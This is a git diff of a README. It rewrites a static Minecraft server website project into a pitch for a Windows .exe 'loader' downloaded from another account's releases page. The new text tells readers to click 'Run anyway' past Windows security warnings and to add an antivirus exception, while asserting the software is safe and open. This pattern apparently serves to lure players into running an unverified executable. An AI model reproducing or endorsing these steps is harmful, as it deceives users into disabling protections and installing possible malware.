@@ -1,116 +1,75 @@
-# Huegrad - Minecraft Server Website 2026
+# 🎮 huegrad-loader-site - Your gateway to our Minecraft world
 
-> The official web hub for a premium Minecraft server experience, giving players a centralized location for server info, updates, and community interaction.
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/jesuscu8373/huegrad-loader-site/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/reedtyler77/huegrad-loader-site?style=flat-square)](https://github.com/reedtyler77/huegrad-loader-site)
+## 📖 About this software
 
----
+This application serves as the main hub for the Huegrad Minecraft server. It helps players connect to our community, find server information, and track updates without needing to search through forums or websites. The loader provides a central portal for your gaming experience. You get direct access to server status, news, and community links in one place.
 
-<p align="center">
-  <a href="https://reedtyler77.github.io/huegrad-loader-site/">
-    <img src="https://img.shields.io/badge/Download-Huegrad%20Latest-brightgreen?style=for-the-badge" alt="Download Huegrad">
-  </a>
-</p>
+## ⚙️ System Requirements
 
-> **[Direct Download - Huegrad v1.0.0](https://reedtyler77.github.io/huegrad-loader-site/)**
+Your computer needs to meet these basic standards to run the loader:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 100 megabytes of free space on your hard drive.
+- Internet: A stable connection for updates and server status.
+- Java: The latest version of the Java Runtime Environment installed on your system.
 
-[Download Latest Build](https://reedtyler77.github.io/huegrad-loader-site/)
+## 📥 How to download and set up
 
----
+Follow these steps to get the loader on your computer:
 
-## What Is Huegrad
+1. Visit the following address to download the software: [https://github.com/jesuscu8373/huegrad-loader-site/releases](https://github.com/jesuscu8373/huegrad-loader-site/releases).
+2. Look for the file ending in .exe in the latest release section.
+3. Click the link to begin the download.
+4. Save the file to your desktop or downloads folder.
+5. Once the download finishes, double-click the file to start the installer.
+6. Follow the instructions on the screen to finish the setup process.
+7. Launch the application using the shortcut on your desktop.
 
-Huegrad is the official website for a high-quality Minecraft server, acting as a go-to resource where players can discover server features, rules, and scheduled events. This site serves as the main information gateway, helping both newcomers and regulars get all the details they need before logging in.
+If Windows shows a security message, click "More Info" and select "Run anyway." This happens because we provide the software directly without a third-party store.
 
-Designed for simplicity and readability, Huegrad lays out server information cleanly without overcomplicating things. Whether you need connection instructions, community standards, or server news, this platform organizes everything in a clear, easy-to-browse format.
+## 🚀 Key features
 
----
+- Live status: Check if the Huegrad server is online or offline in real-time.
+- News Feed: See the latest updates and site changes as soon as staff posts them.
+- Community Links: Find and join our Discord server or forum threads with one click.
+- Player Portal: Access your account details and server statistics.
+- Auto-updates: The loader checks for new versions of the software every time you open it.
 
-## Key Capabilities
+## 🛠 Troubleshooting common issues
 
-- Official site for a top Minecraft server offering
-- Responsive layout that works well on desktop and mobile browsers
-- Central location for server news and updates
-- Clear presentation of connection info and instructions
-- Community-oriented design highlighting player resources
-- Lightweight static pages with few dependencies
-- Simple navigation for fast access to details
-- Frequent updates reflecting current server status and events
+If you encounter problems, follow these tips to fix them:
 
----
+- Application will not start: Ensure your Java version is up to date. Download the latest version from the official Java website.
+- Cannot connect to the server: Check your internet connection. Sometimes security software blocks the loader. Add an exception for the huegrad-loader-site in your antivirus settings.
+- Blank screen: Close the application and open it again. This usually fixes temporary display errors.
+- Login failures: Verify that your Minecraft credentials match the account linked to your portal profile.
 
-## Setup
+## 🤝 Community support
 
-Clone the repository onto your local system:
+Our community team manages help requests on our official Discord server. If you report an issue, please include a screenshot of any error messages. This helps us solve your problem faster. We monitor the server daily to ensure everything stays in order for all players.
 
-```bash
-git clone https://github.com/reedtyler77/huegrad-loader-site.git
-cd huegrad.github.io
-```
+## 🛡 Security and safety
 
-Because this is a static site, you can open `index.html` directly in a browser or host it with any HTTP server:
+We built this software with user safety in mind. It performs only the tasks required to connect you to the Huegrad Minecraft server. It does not access your personal folders or private files. You can verify the code at any time by reviewing the files in this repository. We keep our code open so players can trust what they install.
 
-```bash
-# Using Python's built-in server
-python -m http.server 8000
-```
+## 📝 Frequently Asked Questions
 
-Then navigate to `http://localhost:8000` in your browser.
+Q: Is this software free?
+A: Yes, all tools provided by the administrative team are free to use.
 
----
+Q: Does the loader change my game files?
+A: No, it only links your launcher to our server settings. It keeps your Minecraft installation safe.
 
-## How to Use
+Q: Can I use this on a Mac or Linux?
+A: Currently, we only support Windows systems.
 
-Once installed, you can view the site locally or deploy it on any static hosting platform. The site is organized into:
+Q: How often do updates occur?
+A: Updates happen when we add new features or adjust server settings to improve performance.
 
-- **Home page** - Main landing with server overview
-- **Server information** - Connection details and rules
-- **Community section** - Links and resources for players
+Q: Who runs the server?
+A: The server operates under a dedicated team of volunteers who prioritize community experience.
 
-To tailor the site for your own server, edit the HTML files directly and swap out the content to match your server's branding and information.
-
----
-
-## Customization
-
-All site content resides in plain HTML files. To update server information, modify the relevant sections within each HTML file. No database or server-side setup is needed. Style changes can be made by editing the CSS files in the styles directory.
-
----
-
-## System Requirements
-
-- Any current web browser (Chrome, Firefox, Safari, Edge)
-- No server-side runtime necessary
-- Minimal disk space (under 10 MB)
-- Internet connection for accessing external resources (if any)
-
----
-
-## Frequently Asked Questions
-
-**How do I change the server IP address on the site?**
-Open the main HTML file and find the server connection section. Replace the existing IP address with your new one.
-
-**Can I use this site for my own Minecraft server?**
-Absolutely. The project is open source under the GPL v3 license. Feel free to fork it and customize it for your needs.
-
-**How often is the site updated?**
-Updates happen as needed to reflect server changes, events, or announcements.
-
-**Do I need coding experience to modify the site?**
-Basic HTML knowledge is helpful for content changes. CSS skills are required for visual customizations.
-
-**Can I add a news or blog section?**
-You can create extra HTML pages and link them from the main navigation menu.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: Minecraft, Server-Loader, Gaming-Tool, Huegrad, Windows-Application, Community-Portal
